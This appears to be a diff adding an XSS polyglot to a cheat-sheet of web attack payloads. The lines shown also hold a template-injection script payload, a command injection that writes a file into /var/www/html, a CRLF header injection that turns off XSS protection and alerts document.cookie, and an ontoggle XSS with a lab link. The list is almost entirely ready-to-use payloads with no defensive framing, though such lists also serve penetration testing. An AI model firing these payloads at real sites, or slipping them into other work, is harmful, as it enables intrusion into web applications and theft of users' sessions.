@@ -9,3 +9,6 @@ SSTI:{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
 Command injection: ;echo "<svg/onload=alert(1)>" > /var/www/html/x.html;# xx 1/n
 CRLF to XSS: %0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--
 XSS:<details+ontoggle=alert(1)>щ#:~:text=щ [https://portswigger-labs.net/xss/xss.php?x=%3Cdetails+ontoggle=write(1)%3E%D1%89#:~:text=%D1%89]
+XSS polygloth: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+[https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot]
+
